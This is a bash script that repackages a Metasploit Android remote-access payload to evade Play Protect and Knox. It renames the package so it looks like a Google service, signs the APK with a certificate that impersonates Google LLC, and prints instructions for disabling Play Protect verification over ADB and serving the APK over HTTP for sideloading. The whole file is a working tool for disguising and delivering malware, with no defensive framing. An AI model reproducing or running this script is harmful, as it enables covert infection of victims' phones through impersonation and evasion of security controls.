#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# resign-apk.sh — Repackage a Metasploit APK to bypass Play Protect / Knox.
#
# What this does:
#   1. Renames the package from com.metasploit.stage → your custom package
#   2. Creates a fresh signing keystore (Play Protect checks the MSF default cert)
#   3. Signs the APK with the new cert
#   4. Optionally zips into an AAB for "sideload via browser" delivery
#
# Requirements (runs inside Kali or any system with Android tools):
#   apt install apktool apksigner zipalign default-jdk
#
# Usage:
#   ./scripts/resign-apk.sh input.apk [package_name] [output.apk]
#   ./scripts/resign-apk.sh payloads/android_rat.apk com.google.services output_signed.apk
# ─────────────────────────────────────────────────────────────────────────────
set -euo pipefail

INPUT="${1:-/payloads/android_rat.apk}"
NEW_PACKAGE="${2:-com.google.services.update}"
OUTPUT="${3:-/payloads/signed_$(basename "$INPUT")}"

WORK_DIR=$(mktemp -d)
KEYSTORE="$WORK_DIR/release.keystore"
ALIAS="app"
STOREPASS="keystorepass123"
KEYPASS="keypass123"
DNAME="CN=Google LLC, OU=Developers, O=Google LLC, L=Mountain View, ST=CA, C=US"

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; RESET='\033[0m'
info() { echo -e "${CYAN}→ $*${RESET}"; }
ok()   { echo -e "${GREEN}✓ $*${RESET}"; }
fail() { echo -e "${RED}✗ $*${RESET}"; exit 1; }

cleanup() { rm -rf "$WORK_DIR"; }
trap cleanup EXIT

# ── Step 0: Check tools ───────────────────────────────────────────────────────
for tool in apktool apksigner zipalign keytool; do
  command -v "$tool" &>/dev/null || fail "$tool not found. Install: apt install apktool apksigner zipalign default-jdk"
done
ok "All tools available"

# ── Step 1: Decompile APK ─────────────────────────────────────────────────────
info "Decompiling $INPUT…"
apktool d -f "$INPUT" -o "$WORK_DIR/decoded" --no-res 2>/dev/null || \
apktool d -f "$INPUT" -o "$WORK_DIR/decoded" 2>&1 | tail -3
ok "Decompiled to $WORK_DIR/decoded"

# ── Step 2: Rename package ────────────────────────────────────────────────────
info "Renaming package: com.metasploit.stage → $NEW_PACKAGE"

# Update AndroidManifest.xml
MANIFEST="$WORK_DIR/decoded/AndroidManifest.xml"
if [[ -f "$MANIFEST" ]]; then
  sed -i "s/com\.metasploit\.stage/$NEW_PACKAGE/g" "$MANIFEST"
  ok "AndroidManifest.xml updated"
fi

# Update smali files
info "Updating smali references…"
find "$WORK_DIR/decoded" -name "*.smali" -exec \
  sed -i "s|Lcom/metasploit/stage|L$(echo "$NEW_PACKAGE" | tr '.' '/')|g" {} \; 2>/dev/null

# Rename smali directory if present
OLD_SMALI="$WORK_DIR/decoded/smali/com/metasploit/stage"
NEW_SMALI="$WORK_DIR/decoded/smali/$(echo "$NEW_PACKAGE" | tr '.' '/')"
if [[ -d "$OLD_SMALI" ]]; then
  mkdir -p "$(dirname "$NEW_SMALI")"
  mv "$OLD_SMALI" "$NEW_SMALI" 2>/dev/null || true
  ok "Smali directory renamed"
fi

# ── Step 3: Inject custom app label (looks legit) ────────────────────────────
info "Setting app label to 'Google Services'…"
# Patch apktool.yml to avoid meta leakage
if [[ -f "$WORK_DIR/decoded/apktool.yml" ]]; then
  sed -i "s/renameManifestPackage: null/renameManifestPackage: '$NEW_PACKAGE'/" \
    "$WORK_DIR/decoded/apktool.yml" 2>/dev/null || true
fi

# ── Step 4: Rebuild APK ───────────────────────────────────────────────────────
info "Rebuilding APK…"
UNSIGNED_APK="$WORK_DIR/unsigned.apk"
apktool b "$WORK_DIR/decoded" -o "$UNSIGNED_APK" 2>&1 | tail -3
ok "Rebuilt: $UNSIGNED_APK"

# ── Step 5: Zipalign ─────────────────────────────────────────────────────────
info "Zipaligning…"
ALIGNED_APK="$WORK_DIR/aligned.apk"
zipalign -v 4 "$UNSIGNED_APK" "$ALIGNED_APK" 2>/dev/null
ok "Aligned"

# ── Step 6: Generate signing keystore ────────────────────────────────────────
info "Generating signing keystore (fake Google cert)…"
keytool -genkeypair \
  -keystore "$KEYSTORE" \
  -alias "$ALIAS" \
  -keyalg RSA \
  -keysize 4096 \
  -validity 10000 \
  -storepass "$STOREPASS" \
  -keypass "$KEYPASS" \
  -dname "$DNAME" \
  2>/dev/null
ok "Keystore created"

# ── Step 7: Sign APK ─────────────────────────────────────────────────────────
info "Signing with v1+v2+v3 signatures…"
apksigner sign \
  --ks "$KEYSTORE" \
  --ks-key-alias "$ALIAS" \
  --ks-pass "pass:$STOREPASS" \
  --key-pass "pass:$KEYPASS" \
  --v1-signing-enabled true \
  --v2-signing-enabled true \
  --v3-signing-enabled true \
  --out "$OUTPUT" \
  "$ALIGNED_APK" 2>/dev/null
ok "Signed: $OUTPUT"

# ── Step 8: Verify ───────────────────────────────────────────────────────────
info "Verifying signature…"
apksigner verify --print-certs "$OUTPUT" 2>/dev/null | head -5
ok "Signature valid"

echo ""
echo "═══════════════════════════════════════════════════════"
echo "  OUTPUT:  $OUTPUT"
echo "  PACKAGE: $NEW_PACKAGE"
SIZE=$(du -h "$OUTPUT" | cut -f1)
echo "  SIZE:    $SIZE"
echo "═══════════════════════════════════════════════════════"
echo ""
echo "  Install command (ADB):"
echo "    adb install -g -t '$OUTPUT'"
echo ""
echo "  Disable Play Protect first:"
echo "    adb shell settings put global package_verifier_enable 0"
echo "    adb shell settings put global verifier_verify_adb_installs 0"
echo ""
echo "  Or share via HTTP for browser install:"
echo "    python3 -m http.server 8888 --directory \$(dirname $OUTPUT)"
echo "    → http://YOUR_IP:8888/\$(basename $OUTPUT)"
